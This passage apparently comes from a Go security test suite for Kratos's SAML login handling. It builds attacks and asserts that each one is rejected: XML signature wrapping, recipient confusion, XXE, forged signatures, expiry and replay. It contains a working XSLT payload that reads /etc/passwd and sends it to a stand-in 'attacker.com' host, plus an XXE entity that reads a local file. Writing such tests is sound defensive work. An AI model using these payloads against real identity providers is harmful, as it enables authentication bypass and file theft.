	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
}

// XSW #8 uses another less restrictive XML element to perform a variation of the attack pattern used in XSW #7.
// This time around the original Assertion is the child of the less restrictive element instead of the copied Assertion.
func TestXSW8AssertionWrap6(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	evilResponseEl := authnRequest.ResponseEl
	evilResponseDoc := etree.NewDocument()
	evilResponseDoc.SetRoot(evilResponseEl)

	// Get and Decrypt SAML Assertion
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

	// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
	ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

	// Copy the Response Element
	// This copy will not be changed and contain the original Response content
	originalResponseEl := evilResponseEl.Copy()
	originalResponseDoc := etree.NewDocument()
	originalResponseDoc.SetRoot(originalResponseEl)

	RemoveResponseSignature(evilResponseDoc)

	RemoveAssertionSignature(originalResponseDoc)
	evilResponseDoc.FindElement("//Response/Assertion/Signature").AddChild(etree.NewElement("Object"))
	evilResponseDoc.FindElement("//Assertion/Signature/Object").AddChild(originalResponseDoc.FindElement("//Assertion"))

	// Change the username
	evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil_alice@example.com")

	// Get Reponse string
	responseStr, err := evilResponseDoc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	// Get all identities
	ids, _ := strategy.D().PrivilegedIdentityPool().ListIdentities(context.Background(), 0, 1000)

	// We have to check that there is either an error or an identity created without the modified attribute
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error") || strings.Contains(string(ids[0].Traits), "alice@example.com"))
}

// If the response was meant for a different Service Provider, the current Service Provider should notice it and reject the authentication
func TestTokenRecipientConfusion(t *testing.T) {

	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Change the ACS Endpoint location in order to change the recipient in the SAML Assertion
	authnRequest.ACSEndpoint.Location = "https://test.com"

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))

}

func TestXMLExternalEntity(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Payload XEE
	xee := "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM  \"file:///dev/random\" >]><foo>&xxe;</foo>"

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, xee+responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestExtensibleStylesheetLanguageTransformation(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Payload XSLT
	xslt := "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"doc\"><xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/><xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/><xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/><xsl:variable name=\"exploitUrl\" select=\"concat($attackerUrl,$escaped)\"/><xsl:value-of select=\"unparsed-text($exploitUrl)\"/></xsl:template></xsl:stylesheet>"
	xsltDoc := etree.NewDocument()
	xsltDoc.ReadFromString(xslt)
	xsltElement := xsltDoc.SelectElement("stylesheet")
	doc.FindElement("//Transforms").AddChild(xsltElement)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestExpiredSAMLResponse(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// The answer was forged on January 1 and therefore we set the current date to January 2 so that it is expired
	TimeNow = func() time.Time {
		rv, _ := time.Parse("Mon Jan 2 15:04:05.999999999 MST 2006", "Wed Jan 2 01:57:09.123456789 UTC 2014")
		return rv
	}

	saml.TimeNow = TimeNow

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestSignSAMLAssertionWithOwnKeypair(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get and Decrypt SAML Assertion in order to encrypt it afterwards
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Sign the SAML assertion with an evil key pair
	keyPair, err := tls.LoadX509KeyPair("./testdata/evilcert.crt", "./testdata/evilkey.key")
	keyPair.Leaf, err = x509.ParseCertificate(keyPair.Certificate[0])
	keyStore := dsig.TLSCertKeyStore(keyPair)

	signingContext := dsig.NewDefaultSigningContext(keyStore)
	signingContext.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
	signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)

	signedAssertionEl, err := signingContext.SignEnveloped(decryptedAssertion)

	// Replace the SAML crypted Assertion in the SAML Response by the assertion signed by our keys
	ReplaceResponseAssertion(t, responseEl, signedAssertionEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestSignSAMLResponseWithOwnKeypair(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()

	// Sign the SAML response with an evil key pair
	keyPair, err := tls.LoadX509KeyPair("./testdata/evilcert.crt", "./testdata/evilkey.key")
	keyPair.Leaf, err = x509.ParseCertificate(keyPair.Certificate[0])
	keyStore := dsig.TLSCertKeyStore(keyPair)

	signingContext := dsig.NewDefaultSigningContext(keyStore)
	signingContext.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
	signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)

	// Sign the whole response
	signedResponseEl, err := signingContext.SignEnveloped(responseEl)
	doc.SetRoot(signedResponseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

func TestSignBothResponseAndAssertionWithOwnKeypair(t *testing.T) {
	// Create the SP, the IdP and the AnthnRequest
	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get and Decrypt SAML Assertion in order to encrypt it afterwards
	decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

	// Sign the SAML assertion with an evil key pair
	keyPair, err := tls.LoadX509KeyPair("./testdata/evilcert.crt", "./testdata/evilkey.key")
	keyPair.Leaf, err = x509.ParseCertificate(keyPair.Certificate[0])
	keyStore := dsig.TLSCertKeyStore(keyPair)

	signingContext := dsig.NewDefaultSigningContext(keyStore)
	signingContext.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
	signingContext.SetSignatureMethod(dsig.RSASHA256SignatureMethod)

	signedAssertionEl, err := signingContext.SignEnveloped(decryptedAssertion)

	// Replace the SAML crypted Assertion in the SAML Response by the assertion signed by our keys
	ReplaceResponseAssertion(t, responseEl, signedAssertionEl)

	// Sign the whole response with own keys pairs
	signedResponseEl, err := signingContext.SignEnveloped(responseEl)
	doc.SetRoot(signedResponseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

	// Send the SAML Response to the SP ACS
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request to Kratos
	strategy.HandleCallback(resp, req, ps)

	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}

// Check if it is possible to send the same SAML Response twice (Replay Attack)
func TestReplayAttack(t *testing.T) {

	testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

	// Generate the SAML Assertion and the SAML Response
	authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

	// Get Response Element
	responseEl := authnRequest.ResponseEl
	doc := etree.NewDocument()
	doc.SetRoot(responseEl)

	// Get Reponse string
	responseStr, err := doc.WriteToString()
	assert.NilError(t, err)

	req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)
	resp := httptest.NewRecorder()

	// Start the continuity
	startContinuity(resp, req, strategy)

	// We make sure that continuity is respected
	ps := initRouterParams()

	// We send the request once to Kratos, everything is in order so there should be no error.
	strategy.HandleCallback(resp, req, ps)
	assert.Check(t, !strings.Contains(resp.HeaderMap["Location"][0], "error"))

	// We send the same request a second time to Kratos, it has already been received by Kratos so there must be an error
	strategy.HandleCallback(resp, req, ps)
	assert.Check(t, strings.Contains(resp.HeaderMap["Location"][0], "error"))
}
